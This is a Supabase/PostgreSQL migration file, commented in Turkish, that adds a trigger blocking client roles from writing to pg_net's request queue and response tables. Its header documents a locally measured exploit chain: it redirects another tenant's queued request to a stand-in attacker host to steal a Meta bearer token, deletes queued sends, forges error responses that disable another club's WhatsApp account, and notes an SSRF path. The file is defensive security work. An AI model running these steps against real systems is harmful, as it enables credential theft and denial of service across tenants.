-- ===========================================================================
-- 0048 — pg_net tablolarina ISTEMCI YAZMASI TETIKLEYICI ILE KAPATILIYOR
-- ===========================================================================
-- BU NASIL OLDU
--   0042 ve 0046 (gonderim tavani), pg_net'in iki tablosunun
--   (net.http_request_queue, net._http_response) PUBLIC'e "arwdDxtm" ile acik
--   oldugunu olctu ve ikisi de ayni sonuca vardi:
--     "Izni geri almak MUMKUN DEGIL ... O tarafta veritabani icinden
--      yapilabilecek bir sey yok."
--   Bu tespitin ILK YARISI dogru, IKINCI YARISI yanlisti. Yeniden olculdu:
--
--     select usesuper from pg_user where usename = current_user;   -> f
--     -- postgres, supabase_admin uyesi DEGIL (pg_auth_members: 0 satir)
--     revoke all on net._http_response from public;
--        -> WARNING: no privileges could be revoked
--           (has_table_privilege('authenticated', ..., 'INSERT') hala t)
--     alter table net._http_response owner to postgres;            -> must be owner
--     alter table net._http_response enable row level security;    -> must be owner
--     create rule ... on insert to net._http_response;             -> must be owner
--     create trigger zz before insert on net._http_response ...    -> CREATE TRIGGER  OK
--
--   Sebep: PUBLIC'e verilen "arwdDxtm" haklari arasinda t = TRIGGER de var.
--   Yani sahibi olmadigimiz tabloya TETIKLEYICI KURABILIYORUZ. RLS, rule ve
--   revoke sahiplik/grantor ister; CREATE TRIGGER istemez. Onceki iki dosya
--   yalnizca revoke/RLS/ownership yollarini denemis, TRIGGER hakkini hic
--   denememisti.
--
-- NASIL YAKALANDI — OLCULEN SOMURU (yerel Docker, tek transaction, rollback)
--   Saldirgan: A kulubunun VELISI — en dusuk yetkili gercek rol.
--     set local role authenticated;
--     select set_config('request.jwt.claims',
--       json_build_object('sub','<A velisi>','role','authenticated')::text, true);
--     select current_user, private.current_profile_role();
--       -> authenticated | veli
--     select has_table_privilege('net.http_request_queue','UPDATE');  -> t
--
--   (1) JETON HIRSIZLIGI — B kulubunun kuyruktaki istegini kendi sunucusuna cevir
--       update net.http_request_queue set url = 'https://saldirgan.example/topla'
--        where id = 999500;                                    -> UPDATE 1
--       Satirin headers alani 'Bearer <B kulubunun Meta jetonu>' tasiyor; istegi
--       pg_net iscisi saldirganin sunucusuna GONDERIR. Jeton, B kulubunun
--       dogrulanmis WhatsApp Business numarasindan mesaj atma yetkisidir.
--
--   (2) GONDERIM ENGELLEME
--       delete from net.http_request_queue where id = 999500;   -> DELETE 1
--
--   (3) SAHTE YANIT -> BASKA KULUBUN WHATSAPP HESABINI KAPATMA
--       insert into net._http_response (id, status_code, content, headers, timed_out)
--       values (999500, 401, '{"error":{"code":190}}', '{}'::jsonb, false);
--                                                               -> INSERT 0 1
--       -- sonra cron KENDI isini yapiyor:
--       select private.wa_yanit_isle();                         -> 1
--       select aktif, devre_disi_sebep from public.wa_hesap
--        where kulup_id = '<B kulubu>';
--       -> false | 'Erisim jetonu gecersiz (Meta hata 190). Panelden yeniden
--                   baglanin.'
--       B kulubunun TUM WhatsApp kanali, A kulubunun bir velisi tarafindan
--       kapatildi. Ayni yolla 131026 basilarak velilerin numaralari kalici
--       olarak 'whatsapp_yok' isaretlenebilir — o numaralara bir daha hic
--       gonderim yapilmaz.
--
--   (4) SSRF: net.http_request_queue'ya serbest satir yazmak, veritabani
--       sunucusuna istenen adrese istek attirmak demektir.
--
-- ERISILEBILIRLIK — BULGUNUN GERCEK AGIRLIGI (kendi bulgumu curutme denemesi)
--   Yukaridaki somuru SQL katmaninda GERCEK ve OLCULDU, ancak bugun urunun
--   disa acik yuzeyinden ULASILAMIYOR. Olculdu:
--     docker inspect supabase_rest_app
--       -> PGRST_DB_SCHEMAS=public,graphql_public
--     curl .../rest/v1/_http_response -H 'Accept-Profile: net' \
--          -H "Authorization: Bearer <gercek authenticated JWT>"
--       -> HTTP 406, PGRST106 "Only the following schemas are exposed:
--          public, graphql_public"
--     curl .../rest/v1/rpc/http_post -H 'Content-Profile: net'  -> ayni hata
--   Ayrica anon/authenticated NOLOGIN'dir; dogrudan SQL oturumu acilamaz.
--
--   Yani bu bir KATMAN ARIZASI degil, KATMAN BAGIMLILIGI: kiraci duvarinin bir
--   parcasi semada degil, PostgREST'in "Exposed schemas" ayarinda duruyor.
--   O listeye bir gun net eklenirse, ya da ileride kullanici JWT'siyle SQL
--   calistiran bir uc konursa, duvar ayni anda duser ve semada onu tutan hicbir
--   sey yoktur. Bu semadaki kural korumalarin UST USTE BINMESI oldugu icin
--   kapatiliyor.
--
-- NEDEN TETIKLEYICI (RLS / REVOKE DEGIL)
--   - revoke: yetkiyi veren supabase_admin; postgres ne o rolun uyesi ne de
--     superuser. Sessizce WARNING verip hicbir sey yapmiyor (olculdu).
--   - RLS / rule / owner degistirme: hepsi tablo sahipligi istiyor
--     -> "must be owner of table _http_response".
--   - trigger: PUBLIC'in t hakkiyla kurulabiliyor ve INSERT/UPDATE/DELETE'in
--     UCUNU birden kapsiyor. Elimizdeki tek kaldirac bu.
--
-- FONKSIYON SECURITY INVOKER OLMAK ZORUNDA
--   SECURITY DEFINER yazilsaydi govdedeki current_user fonksiyonun SAHIBI
--   (postgres) olurdu ve kontrol HICBIR ZAMAN devreye girmezdi — sessizce ise
--   yaramayan bir "koruma". Bu yuzden bilincli olarak invoker; dogrulama blogu
--   da bunu ayrica kontrol ediyor.
--   (Tetikleyici fonksiyonlarinda calisma aninda EXECUTE kontrolu yapilmaz;
--    izin kontrolu CREATE TRIGGER anindadir. Bu yuzden fonksiyonun anon/
--    authenticated rollerine acik olmasi gerekmiyor.)
--
-- BEYAZ LISTE DEGIL KARA LISTE
--   pg_net'in arka plan iscisinin hangi rolle yazdigi belgelenmis degil.
--   "Su roller yazabilir" denseydi ve isci listede olmasaydi TUM WhatsApp
--   gonderimi sessizce dururdu — 0037'de tam olarak bu sinif hata yapilmisti.
--   Bu yuzden yalnizca anon ve authenticated reddediliyor; postgres,
--   service_role, supabase_admin ve isci ne yapiyorsa yapmaya devam ediyor.
--   Guvenlikte kara liste genelde yanlistir; burada dogru olan, cunku
--   engellenecek kume (PostgREST'in kullandigi iki rol) TAM ve KAPALI.
--
-- KAPATMADIGI SEY — DURUSTCE
--   OKUMA hala acik: "select headers from net.http_request_queue" ile jeton
--   okunabilir. Tetikleyici SELECT'i kapsamaz; SELECT'i kapatmak RLS ister,
--   RLS sahiplik ister. Kalan yol 0042'nin yazdigi gibi: Supabase destek
--   talebi ya da gonderimi veritabaninin disina tasimak. 0046'nin islenmis
--   yanit satirini silmesi okuma penceresini zaten ~1 dakikaya indirmisti;
--   bu dosya YAZMA yuzeyini tamamen kapatiyor.
--
-- KARSI-TEST (yerelde kosuldu, hepsi gecti)
--   - postgres olarak private.wa_gonder(5): net.http_post satir yazdi -> OK
--   - postgres olarak net._http_response insert + private.wa_yanit_isle()
--     (islenen satiri siliyor) -> OK
--   - service_role olarak her iki tabloya insert/update/delete -> OK
--   - authenticated (veli) olarak ayni uc islem -> REDDEDILDI
--
-- GERI ALMA — TEK YOL FONKSIYON GOVDESI
--   DROP TRIGGER ve ALTER TABLE ... DISABLE TRIGGER tablo SAHIPLIGI ister;
--   ikisini de yapamiyoruz (olculdu: "must be owner of relation
--   http_request_queue"). Yani bu kilit kurulduktan sonra SILINEMEZ.
--   Kilit bir gun mesru bir akisi kirarsa acil cikis su:
--     create or replace function public.net_istemci_yazamaz()
--     returns trigger language plpgsql as $x$
--     begin return case when tg_op='DELETE' then old else new end; end $x$;
--   Tetikleyici yerinde kalir ama hicbir sey reddetmez.
--
-- CALISTIRMA: 0047'den sonra. Tekrar calistirilabilir. pg_net yoksa atlanir.
-- ===========================================================================

create or replace function public.net_istemci_yazamaz()
returns trigger
language plpgsql
-- SECURITY INVOKER (varsayilan) — bkz. baslik. DEFINER yapilirsa koruma oler.
set search_path = ''
as $fn$
begin
  if current_user in ('anon', 'authenticated') then
    raise exception 'pg_net kuyruk/yanit tablolarina istemci rolleri yazamaz (0048).'
      using errcode = 'insufficient_privilege';
  end if;
  if tg_op = 'DELETE' then
    return old;
  end if;
  return new;
end;
$fn$;

comment on function public.net_istemci_yazamaz() is
  '0048: net.http_request_queue ve net._http_response uzerinde anon+authenticated yazmasini reddeder. Tablolar supabase_admin sahipliginde oldugu icin revoke/RLS mumkun degil; PUBLIC uzerindeki TRIGGER hakki tek kaldirac.';

do $kilit$
declare
  v_tablo text;
begin
  if not exists (select 1 from pg_namespace where nspname = 'net') then
    raise notice '0048: pg_net kurulu degil, yapilacak bir sey yok.';
    return;
  end if;

  foreach v_tablo in array array['http_request_queue', '_http_response'] loop
    if not exists (
      select 1 from pg_class c join pg_namespace n on n.oid = c.relnamespace
       where n.nspname = 'net' and c.relname = v_tablo and c.relkind = 'r'
    ) then
      raise notice '0048: net.% yok, atlaniyor.', v_tablo;
      continue;
    end if;

    -- TEKRAR CALISTIRILABILIRLIK: "drop trigger if exists" YAZILAMAZ.
    -- Olculdu: DROP TRIGGER tablo SAHIPLIGI ister ("must be owner of relation
    -- http_request_queue"), CREATE TRIGGER ise PUBLIC'in t hakkiyla yetinir.
    -- Ilk yazimda drop vardi ve dosya ikinci calistirmada koruma YERINDE
    -- oldugu halde "kilit kurulamadi" uyarisi veriyordu. Bu yuzden once varlik
    -- kontrolu yapiliyor.
    if exists (select 1 from pg_trigger
                where tgname = 'zz_istemci_yazamaz'
                  and tgrelid = ('net.' || quote_ident(v_tablo))::regclass) then
      raise notice '0048: net.% kilidi zaten kurulu.', v_tablo;
      continue;
    end if;

    begin
      execute format(
        'create trigger zz_istemci_yazamaz before insert or update or delete on net.%I '
        'for each row execute function public.net_istemci_yazamaz()', v_tablo);
      raise notice '0048: net.% uzerine yazma kilidi kuruldu.', v_tablo;
    exception when others then
      -- Sahiplik/izin degisirse kurulum paketi BURADA DURMAMALI: pg_net yazma
      -- kilidi bir sertlestirmedir, kurulumun on sarti degil. (0043'te pg_cron
      -- icin ayni gerekceyle sarmalama yapilmisti.)
      raise warning '0048: net.% uzerine tetikleyici KURULAMADI (%). pg_net yazma yuzeyi acik kaliyor; Supabase destek talebi gerekir.', v_tablo, sqlerrm;
    end;
  end loop;
end $kilit$;


-- ===========================================================================
-- DOGRULAMA
-- ===========================================================================
do $$
declare v_sd boolean;
begin
  select prosecdef into v_sd
    from pg_proc p join pg_namespace n on n.oid = p.pronamespace
   where n.nspname = 'public' and p.proname = 'net_istemci_yazamaz';

  if v_sd then
    raise exception '0048: net_istemci_yazamaz SECURITY DEFINER olmus — current_user sahibi doner ve koruma calismaz.';
  end if;

  if exists (select 1 from pg_namespace where nspname = 'net')
     and exists (select 1 from pg_class c join pg_namespace n on n.oid = c.relnamespace
                  where n.nspname = 'net' and c.relname = '_http_response')
     and not exists (select 1 from pg_trigger
                      where tgname = 'zz_istemci_yazamaz'
                        and tgrelid = 'net._http_response'::regclass) then
    raise warning '0048: net._http_response uzerinde kilit YOK — pg_net yazma yuzeyi acik.';
  end if;

  raise notice '0048 tamam: pg_net yazma yuzeyi istemci rollerine kapatildi (okuma hala acik — bkz. baslik).';
end $$;
